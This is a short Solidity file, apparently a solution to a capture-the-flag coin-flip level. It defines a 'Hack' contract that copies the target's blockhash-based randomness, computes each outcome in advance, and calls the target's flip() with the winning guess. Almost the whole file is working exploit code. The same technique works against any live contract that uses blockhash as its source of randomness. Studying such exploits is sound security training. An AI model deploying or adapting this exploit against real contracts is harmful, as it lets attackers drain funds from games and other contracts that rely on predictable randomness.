// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './SafeMath.sol';



/***
 * dev: we make an interface with the method we want to hack.
 * */
interface ContractInterface {
    
      function flip(bool _guess) external returns (bool);
     // uint256 external consecutiveWins;
}


contract Hack {
    
  ContractInterface contractOriginal;

  using SafeMath for uint256;
  
 /***
 * 
 * dev: We duplicate global variables from the original contract to emulate the behavior
 **/
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  

/***
 * 
 * @addressContract address of the contract to hack
 **/
  constructor(address addressContract) public {
    contractOriginal = ContractInterface(addressContract);
  }
  
  
  function hackflip() public returns(bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
      
      return contractOriginal.flip(side);
  }
  
}